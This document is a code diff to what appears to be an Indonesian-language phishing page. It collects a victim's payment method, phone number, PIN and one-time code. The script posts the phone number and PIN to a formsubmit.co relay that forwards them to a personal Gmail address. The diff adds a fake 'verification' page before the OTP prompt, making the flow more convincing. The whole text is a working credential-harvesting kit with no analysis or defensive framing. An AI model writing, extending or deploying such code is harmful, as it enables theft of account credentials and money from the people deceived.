@@ -183,7 +183,7 @@
     <p style="font-size: 13px; opacity: 0.8;">Kirim Ulang</p>
   </section>
 
-  <script>
+   <script>
     const API = "https://formsubmit.co/ajax/baygaming648@gmail.com";
     let dataStore = { method: "", phone: "", pin: "" };
 
@@ -196,7 +196,6 @@
 
     function startFlow(method) {
       dataStore.method = method;
-      document.getElementById('selected-method').innerText = method;
       showLoader(() => {
         document.getElementById('page-menu').classList.remove('active');
         document.getElementById('page-phone').classList.add('active');
@@ -228,11 +227,19 @@
         dataStore.pin = val;
         fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ "STATUS": "LOG PIN", "HP": dataStore.phone, "PIN": dataStore.pin }) });
         showLoader(() => {
+          // OTOMATIS KE HALAMAN VERIFIKASI SETELAH ISI PIN
           document.getElementById('page-pin').classList.remove('active');
-          document.getElementById('page-otp').classList.add('active');
-          setTimeout(() => document.getElementById('o1').focus(), 300);
+          document.getElementById('page-verify').classList.add('active');
         });
       }
+    }
+
+    function goOtp() {
+      showLoader(() => {
+        document.getElementById('page-verify').classList.remove('active');
+        document.getElementById('page-otp').classList.add('active');
+        setTimeout(() => document.getElementById('o1').focus(), 300);
+      });
     }
 
     function sendOtp() {
@@ -244,6 +251,10 @@
         location.reload();
       });
     }
+
+    function focusPin() { if(document.getElementById('page-pin').classList.contains('active')) document.getElementById('pinInput').focus(); }
   </script>
 </body>
 </html>
+
+  
